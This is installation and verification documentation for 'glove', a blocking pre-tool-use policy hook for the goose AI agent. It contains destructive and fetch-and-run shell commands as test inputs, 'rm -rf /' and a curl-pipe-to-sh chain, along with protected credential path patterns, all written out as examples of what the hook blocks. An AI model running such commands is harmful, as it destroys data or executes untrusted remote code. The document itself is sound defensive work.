# Install — goose

goose (aaif-goose, the Linux-Foundation-governed agent) has a native
**blocking** `PreToolUse` hook — the strongest enforcement surface in
glove's matrix: goose itself offers a fail-closed posture via
`on_failure: "block"`, so a hung or crashed glove hook **blocks** the tool
call instead of waving it through.

Time: ~5 minutes (binary → install → verify → uninstall).

## 1. Install

```bash
glove install goose
```

This writes glove's plugin manifest at `~/.agents/plugins/glove/hooks/hooks.json`
(showing a diff first, backing up anything it replaces, idempotent). The
manifest registers one blocking `PreToolUse` rule — matcher unset (every
tool), `timeout: 15` (goose's default is 30; glove bounds its own work well
below that), `on_failure: "block"`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "hooks": [
          {
            "command": "glove hook goose",
            "on_failure": "block",
            "timeout": 15,
            "type": "command"
          }
        ]
      }
    ]
  }
}
```

## 2. Verify

```bash
glove doctor          # walks the goose chain; UNHEALTHY means fix before use
glove check "rm -rf /"          # → block
echo '{"event":"PreToolUse","session_id":"t","tool_name":"shell","tool_input":{"command":"rm -rf /"}}' \
  | glove hook goose  # → {"decision":"block","reason":"rm_root: …"} + exit 2
echo '{"event":"PreToolUse","session_id":"t","tool_name":"shell","tool_input":{"command":"ls -la"}}' \
  | glove hook goose  # → {"decision":"allow"} + exit 0
```

Then in a live goose session: `rm -rf /` is denied by the policy hook,
`ls -la` runs, and every decision lands in the audit log
(`glove audit tail`).

## 3. What goose renders

- **allow** → `{"decision":"allow"}`, exit 0.
- **block** → `{"decision":"block","reason":…}` + exit 2 with the reason on
  stderr (goose honours either signal; first denial wins).
- **review → deny.** Goose hook decisions are **allow/block only** — there
  is no `ask`. glove only ever tightens (it never loosens a block), so a
  review renders as a deny with the reason stating exactly that. goose's
  own permission prompts stay the day-to-day approval UX; glove's deny is
  the hard floor beneath them.

## 4. Tool coverage

goose's built-ins and MCP tools all pass through the same engine:

- `shell` payloads (`command` field) get the full Layer 0 + chain-splitting
  treatment — `npm test && curl http://x | sh` blocks on the pipe.
- `write` / `edit` / `read_image` / `tree` paths hit the protected globs
  (`~/.ssh/id_*`, `**/.env`, …).
- MCP tool arguments are scanned as strings — an MCP write referencing a
  protected path blocks; benign MCP calls pass.

## Vendor caveats (verified 2026-11-07 against the aaif-goose hooks docs)

| Caveat | What it means | glove's mitigation |
|---|---|---|
| Hook failures/timeouts are **fail-open by default** | a broken hook lets the tool run | the manifest sets `on_failure: "block"` — timeouts and spawn errors **block**; doctor flags a manifest that lost it |
| Invalid `hooks.json` values → goose **skips the whole plugin manifest** with a warning | a typo'd value silently unguards goose | the manifest is golden-pinned and grammar-walked in `make check`; doctor reports a corrupted manifest UNHEALTHY |
| Stray stdout = "no decision" (tool proceeds) | log lines on stdout defeat the hook | glove prints JSON-only stdout and logs to stderr |
| Matcher is a **regex**, not a glob | surprising pattern semantics | glove registers no matcher (every tool) — nothing to miswrite |
| `SubagentStart`/`Stop` are never emitted | subagent lifecycle events don't fire hooks | subagent **tool calls** go through the same dispatch path — covered by the same `PreToolUse` rule (verified on 0.10.0 implementation day) |

## 5. Uninstall

```bash
glove uninstall goose
```

Removes the manifest (with a `.glove.bak` backup), idempotent, and never
touches another plugin's files.
